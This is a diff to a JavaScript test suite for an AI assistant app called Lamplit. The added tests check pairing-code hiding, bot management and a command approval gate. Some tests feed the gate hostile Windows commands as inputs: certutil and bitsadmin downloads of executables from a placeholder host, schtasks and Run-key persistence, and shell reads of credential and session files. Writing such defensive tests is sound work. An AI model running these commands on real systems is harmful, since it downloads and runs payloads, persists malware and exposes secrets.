@@ -4055,6 +4055,125 @@ async function scenarioMcp({ home, toolsMod }) {
     const desk3 = await readText('../desktop/main.mjs');
     check('K27 desktop: the app sends the key with its own requests to this computer\'s hub only', desk3.includes("'x-lamplit-local': key") && desk3.includes('ownHub = Number(new URL(details.url).port) === Number(serverPort)') && desk3.includes('sendLocalKey();'));
   }
+  // 1.5.32 (A1/A2): a program on this computer read the pairing code from /api/settings and paired itself;
+  // a browser on this computer could not decide at all. Now: the code only for the human, a browser the human paired may decide.
+  {
+    const noKey = (p, o = {}) => rawFetch(`${base}${p}`, { ...o, headers: { 'content-type': 'application/json', ...(o.headers || {}) } });
+    const settings = await (await noKey('/api/settings')).json();
+    const auth = await (await noKey('/api/auth')).json();
+    const withKey = (await api('/api/settings')).json;
+    const ownAuth = (await api('/api/auth')).json;
+    check('K32 the pairing code: a request from this computer without the app\'s key gets no code from /api/settings (it is told it is hidden) and is told it may not decide; the app sees both',
+      settings.pairing?.code === '' && settings.pairing?.hidden === true && auth.authority === false
+      && /^\d{8}$/.test(withKey?.pairing?.code || '') && !withKey?.pairing?.hidden && ownAuth?.authority === true, JSON.stringify({ p: settings.pairing, a: auth, o: ownAuth }));
+    const before = await noKey('/api/approvals/ap_nothing', { method: 'POST', body: JSON.stringify({ decision: 'approve' }) });
+    const refusal = await before.json().catch(() => ({}));
+    const wrongCookie = await noKey('/api/approvals/ap_nothing', { method: 'POST', headers: { cookie: 'desk_session=nope' }, body: JSON.stringify({ decision: 'approve' }) });
+    const AU = await import('../src/auth.mjs');
+    const devs = { findBySession: (t) => (t === 'paired-here' ? { id: 'd1' } : null) };
+    const local = { mode: 'local', authorized: true };
+    check('K32 a browser on this computer: refused in Chinese with what to do; paired with the code (typed by the human) its session may decide; a made-up session may not',
+      before.status === 403 && /本人确认/.test(refusal?.error?.message || '') && wrongCookie.status === 403
+      && AU.carriesLocalKey({ headers: { cookie: 'desk_session=paired-here' } }, local, home, devs) === true
+      && AU.carriesLocalKey({ headers: { cookie: 'desk_session=nope' } }, local, home, devs) === false
+      && AU.carriesLocalKey({ headers: {} }, local, home, devs) === false,
+      JSON.stringify([before.status, wrongCookie.status]));
+    const { reachesSecrets } = await import('../src/agent.mjs');
+    const ask = (c) => Boolean(reachesSecrets('shell', { command: c }));
+    const srv = await readText('../src/server.mjs');
+    check('K32 the keys to this computer: the pairing code is printed only to a terminal (not the desktop app\'s startup.log); reading the token, the paired sessions or the log asks every time; the app\'s other data still does not',
+      srv.includes("console.error(process.stderr.isTTY\n    ? `[assistant] pairing code: ${state.security.code} (also shown in Settings)`")
+      && ask('type %APPDATA%\\Desk\\startup.log') && ask('cat /opt/desk-hub/data/security.json') && ask('python3 -c "print(open(\'data/devices.json\').read())"') && ask('cat data/*')
+      && !ask(`python3 -c "import json;print(json.load(open('/opt/desk-hub/data/routines.json')))"`));
+    const core = await readText('../public/app/main/04-bots.js');
+    const sets = await readText('../public/app/main/08-settings.js');
+    const page = await readText('../public/index.html');
+    check('K32 the page: a refusal opens 「这一步要你本人确认」 with a box for the code (no English line), settings do not ask for the code without the key, the sign-in help no longer says to curl /api/pairing',
+      core.includes("if (err.code === 'LOCAL_KEY_REQUIRED') {") && core.includes('localPairOpen(true);') && page.includes('id="local-pair-modal"') && page.includes('配对这个浏览器')
+      && sets.includes("const mayDecide = state.auth?.authority !== false;") && !page.includes('id="auth-curl"'));
+  }
+  // 1.5.32 (A4/A5): a deleted bot left its approval card behind (the badge counted it, a tap did nothing);
+  // the primary could be deleted over the API; names had no limit and could repeat.
+  {
+    const long = await api('/api/bots', { method: 'POST', body: { name: '长'.repeat(41) } });
+    const longRole = await api('/api/bots', { method: 'POST', body: { name: '职责太长', role: 'x'.repeat(201) } });
+    const first = await api('/api/bots', { method: 'POST', body: { name: '复查员甲' } });
+    const twin = await api('/api/bots', { method: 'POST', body: { name: ' 复查员甲 ' } });
+    const other = await api('/api/bots', { method: 'POST', body: { name: '复查员乙' } });
+    const rename = other.json?.bot?.id || other.json?.id ? await api(`/api/bots/${encodeURIComponent(other.json?.bot?.id || other.json?.id)}`, { method: 'PATCH', body: { name: '复查员甲' } }) : { status: 0 };
+    check('K32 bot names: at most 40 characters (role 200), refused in Chinese; a second bot with the same name (any case, spaces) is refused, also by renaming',
+      long.status === 400 && /最多 40 个字/.test(long.json?.error?.message || '') && longRole.status === 400 && [200, 201].includes(first.status)
+      && twin.status === 400 && /已经有一个叫/.test(twin.json?.error?.message || '') && rename.status === 400,
+      JSON.stringify([long.status, longRole.status, first.status, twin.status, other.status, rename.status]));
+    const B = await import('../src/bots.mjs');
+    const tl = await readText('../src/tools.mjs');
+    check('K32 a bot making a teammate with a taken name gets the next free one (「研究员 2」)',
+      tl.includes('        uniqueName: true,') && B.BOT_LIMITS.name === 40);
+    const ids = [first, other].map((r) => r.json?.bot?.id || r.json?.id).filter(Boolean);
+    const A = await import('../src/approvals.mjs');
+    const q = new A.ApprovalQueue({ timeoutMs: 60000 });
+    q.request({ turnId: 't1', botId: 'gone', toolName: 'shell', args: {}, risk: 'HIGH', reason: 'x' }).catch(() => {});
+    q.request({ turnId: 't2', botId: 'stays', toolName: 'shell', args: {}, risk: 'HIGH', reason: 'x' }).catch(() => {});
+    const closed = q.cancelForBot('gone');
+    const left = q.list({ status: 'pending' });
+    check('K32 deleting a bot closes its approval cards (「已取消：助手已删除」), not anyone else\'s',
+      closed.length === 1 && closed[0].status === 'denied' && closed[0].note === '已取消：助手已删除' && left.length === 1 && left[0].botId === 'stays', JSON.stringify({ closed, left: left.map((r) => r.botId) }));
+    const del = ids[0] ? await api(`/api/bots/${encodeURIComponent(ids[0])}`, { method: 'DELETE' }) : { status: 0 };
+    const primaryId = (await api('/api/bots')).json?.find?.((b) => b.primary)?.id;
+    const delPrimary = await api(`/api/bots/${encodeURIComponent(primaryId || 'chief')}`, { method: 'DELETE' });
+    const srv = await readText('../src/server.mjs');
+    const live = await readText('../public/app/main/06-live.js');
+    check('K32 deleting: the reply says what was cleared (its task, cards, routines switched off); the primary assistant cannot be deleted over the API either; the badge opens a gone bot\'s card where it is',
+      del.status === 200 && del.json?.cleared && typeof del.json.cleared.approvals === 'number' && delPrimary.status === 400 && /主助理/.test(delPrimary.json?.error?.message || '')
+      && srv.includes('const botsApi = { listBots, getBot, createBot, updateBot, deleteBot: removeBot };') && srv.includes('if (r.botId === id && r.enabled) { await refs.routines.update(r.id, { enabled: false }); routinesOff += 1; }')
+      && live.includes('const known = !botId || (state.bots || []).some((b) => b.id === botId);'), JSON.stringify([del.status, del.json?.cleared, delPrimary.status]));
+    for (const id of ids.slice(1)) await api(`/api/bots/${encodeURIComponent(id)}`, { method: 'DELETE' });
+  }
+  // 1.5.32 (A3): in demo mode the four things the empty chat suggests all got the same "I am in demo mode" line.
+  {
+    const M = await import('../src/model.mjs');
+    const botsSrc = await readText('../public/app/main/04-bots.js');
+    const starters = [...botsSrc.matchAll(/^  \['[A-D]', '[^']+', '[^']+', '([^']+)'\],$/gm)].map((m) => m[1]);
+    const plans = starters.map((t) => M.demoPlan(t));
+    const tools = plans.map((p) => p.map((s) => s.tool || 'text').join(','));
+    const said = (p) => JSON.stringify(p);
+    check('K32 demo mode: each of the four suggested starts plays its own scripted run (tidy: a checklist, files, a command that asks first; write: a file; daily: a routine, paused; research: what a model would do) and ends with 「这是演示脚本」',
+      starters.length === 4 && new Set(tools).size === 4
+      && /^task_plan,(fs_write,){4}task_step,fs_list,task_step,shell,task_step,task_end,task_finish$/.test(tools[0])
+      && tools[1] === 'text' && /演示模式不联网/.test(said(plans[1]))
+      && tools[2] === 'fs_write,task_finish' && plans[2][0].args.path === '演示/请假邮件.md'
+      && tools[3] === 'routine_create,routine_list,task_finish' && plans[3][0].args.enabled === false
+      && plans.every((p) => /这是演示脚本/.test(said(p))), JSON.stringify(tools));
+    const hello = M.demoPlan('你好');
+    check('K32 demo mode: 「你好」 says what can be tried; a group asked in Chinese answers in Chinese',
+      /整理下载文件夹/.test(said(hello)) && /每天提醒我/.test(said(hello)) && (await readText('../src/model.mjs')).includes("say(`收到：${shortQuote(text, 60)}。我问问大家。`"));
+  }
+  // 1.5.32: the bots' own Windows account is asked about once at the end of getting started, and the checkup keeps saying so.
+  {
+    const srv = await readText('../src/server.mjs');
+    const bots = await readText('../public/app/main/04-bots.js');
+    const mach = await readText('../public/app/main/11-machines.js');
+    const check1 = (await api('/api/checkup')).json;
+    check('K32 isolation: the checkup has 「命令隔离」 on Windows (warn with 「设置单独账户」 until it is on); getting started asks once (on this computer, skippable)',
+      srv.includes("checkupItem('isolation', '命令隔离', 'warn', '没开：机器人执行的命令和你用同一个账户") && mach.includes("else if (action.kind === 'runner') setupRunnerAccount()")
+      && bots.includes("appendIsolationAsk().catch(() => {});") && bots.includes("const ISOLATION_ASKED = 'lamplit.isolationAsked';") && bots.includes("'以后再说'")
+      && (process.platform !== 'win32' || (check1?.items || []).some((i) => i.id === 'isolation')), JSON.stringify((check1?.items || []).map((i) => i.id)));
+  }
+  // 1.5.32 small ones: a wrong schedule is a 400 in Chinese; Windows download-and-run and start-at-login are refused; the words people see.
+  {
+    const bad = await api('/api/routines', { method: 'POST', body: { name: 'x', instruction: 'y', schedule: 'whenever' } });
+    const zero = await api('/api/routines', { method: 'POST', body: { name: 'x', instruction: 'y', schedule: 'every 0 minutes' } });
+    const AP = await import('../src/approvals.mjs');
+    const deny = (c) => AP.matchedDenyPatterns(c).length > 0;
+    const page = await readText('../public/index.html');
+    const pkg = JSON.parse(await readText('../package.json'));
+    check('K32 small: a schedule typed wrong is 400 with examples in Chinese; certutil/bitsadmin downloads, schtasks /create and reg add …\\Run are dangerous commands (schtasks /query is not); 「一键最严」「助手」 instead of strict/Bot; the about page links feedback and the survey; one name in the description',
+      bad.status === 400 && /时间的写法不对/.test(bad.json?.error?.message || '') && zero.status === 400
+      && deny('certutil -urlcache -f http://x/a.exe a.exe') && deny('bitsadmin /transfer j http://x/a C:\\a.exe') && deny('schtasks /create /tn x /tr a.exe /sc onlogon')
+      && deny('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d a.exe') && !deny('schtasks /query')
+      && page.includes('>一键最严</button>') && !page.includes('一键 strict') && !page.includes('一套 Bot') && page.includes('https://wj.qq.com/s2/28728882/7epm/')
+      && pkg.description.startsWith('Lamplit - a personal'), JSON.stringify([bad.status, zero.status]));
+  }
   // 1.5.26: each bot has its own browser on its own screen; a takeover card waits for the tap.
   {
     const br = await readText('../src/browser.mjs');
@@ -4101,7 +4220,7 @@ async function scenarioMcp({ home, toolsMod }) {
     check('B24 browser_upload: workspace files go into the page\'s file box (input type=file, shadow DOM too) through the browser tool; files outside the workspace are refused',
       toolsSrc.includes("name: 'browser_upload',") && toolsSrc.includes("throw toolError('OUTSIDE_WORKSPACE'") && br.includes("await page.send('DOM.setFileInputFiles', { files: absPaths, objectId }") && br.includes('if (host.shadowRoot) walk(host.shadowRoot);'));
     check('B24 放手 machine: scripts on the browser\'s control port and scripts using Lamplit\'s modules run unasked there; the vault\'s keys still ask on every machine',
-      ag.includes("if (name === 'shell' && !freeMachine && DEVTOOLS.test(") && ag.includes('if (secretReason && (vaultReason || !freeMachine) && verdict.decision !== DECISION.DENY)') && ag.includes("const vaultReason = /保险箱/.test(secretReason || '');"));
+      ag.includes("if (name === 'shell' && !freeMachine && DEVTOOLS.test(") && ag.includes('if (secretReason && (vaultReason || !freeMachine) && verdict.decision !== DECISION.DENY)') && ag.includes("const vaultReason = /保险箱|本机密钥/.test(secretReason || '');"));
   }
   // 1.5.23: an update push that broke off is tried again by itself.
   {
@@ -5342,7 +5461,12 @@ async function scenarioDocs1513() {
   check('D1 site: every page has its twin in the other language (data-other, hreflang, a 中文 / EN switch); a choice is kept; a browser that reads no Chinese goes to English once; the Chinese pages link the user survey',
     zhHome.includes('data-other="en/"') && enHome.includes('data-other="../"') && zhDocs.includes('data-other="en/docs.html"') && enDocs.includes('data-other="../docs.html"')
     && [zhHome, zhDocs].every((p) => p.includes('data-lang-switch="en"') && p.includes('hreflang="en"')) && [enHome, enDocs].every((p) => p.includes('data-lang-switch="zh"') && p.includes('lang="en"'))
-    && enHome.includes('../style.css?v=1532') && zhHome.includes('id="survey"') && zhHome.includes('href="https://wj.qq.com/s2/') && zhDocs.includes('href="https://wj.qq.com/s2/') && siteJs.includes("localStorage.setItem(LANG, a.dataset.langSwitch)") && siteJs.includes('if (!chosen && lang === \'zh\' && !readsChinese'));
+    && enHome.includes('../style.css?v=1533') && zhHome.includes('id="survey"') && zhHome.includes('href="https://wj.qq.com/s2/') && zhDocs.includes('href="https://wj.qq.com/s2/') && siteJs.includes("localStorage.setItem(LANG, a.dataset.langSwitch)") && siteJs.includes('if (!chosen && lang === \'zh\' && !readsChinese'));
+  check('D1b site (11-18): the Chinese pages load no Google Fonts; each home page has a real title, a 1200x630 share image and the first-run note (unsigned installer: 更多信息 → 仍要运行, SHA-256 on the release page)',
+    ![zhHome, zhDocs].some((p) => p.includes('fonts.googleapis.com')) && zhHome.includes('<title>Lamplit：有自己电脑的 AI 助理</title>') && enHome.includes('<title>Lamplit — an AI assistant with a computer of its own</title>')
+    && zhHome.includes('<meta property="og:image" content="https://20chuangge.github.io/lamplit/og.png" />') && enHome.includes('og-en.png') && zhHome.includes('summary_large_image')
+    && zhHome.includes('「更多信息」→「仍要运行」') && enHome.includes('"More info" → "Run anyway"')
+    && fsSync.existsSync(path.join(REPO, 'site', 'og.png')) && fsSync.existsSync(path.join(REPO, 'site', 'og-en.png')));
   const ids = ['machines', 'machine-home', 'machine-cloud', 'pitfalls'];
   check('D2 add-machine guide in both languages: home computer, cloud server (Tailscale auth key, 4390 kept closed), and the pitfalls: proxy vs 100.64.0.0/10, security group, AppArmor, the daily pairing code, Chinese user names, OpenSSH, bridged VMs',
     ids.every((id) => zhDocs.includes(`id="${id}"`) && enDocs.includes(`id="${id}"`))
@@ -5767,8 +5891,8 @@ async function scenarioAuthEscape156() {
     auth.includes('id="auth-back"') && bots.includes("$('auth-back').hidden = !(window.desk?.useLocal && !onLocalMachine());")
     && wiring.includes("$('auth-back')?.addEventListener('click'") && wiring.includes('window.desk.useLocal()'));
   check('A3 the code: where to find it (any paired device, the machine itself, or adding the machine again from this computer), with the right settings page',
-    auth.includes('id="auth-help"') && auth.includes('设置 → 手机和外网') && auth.includes('id="auth-curl"') && auth.includes('添加机器')
-    && bots.includes("$('auth-curl').textContent") && !bots.includes('「设置 → 配对」') && !auth.includes('「设置 → 配对」'));
+    auth.includes('id="auth-help"') && auth.includes('设置 → 手机和外网') && auth.includes('配对码打印在终端的启动信息里') && auth.includes('添加机器')
+    && !bots.includes("$('auth-curl')") && !bots.includes('「设置 → 配对」') && !auth.includes('「设置 → 配对」'));
   check('A4 English for the new words', en.includes('"← 回到这台电脑"') && en.includes('"找不到配对码？"'));
   // The screen comes from the machine: one still on an older version (and it
   // cannot be updated while unpaired) shows its old screen. The desktop app
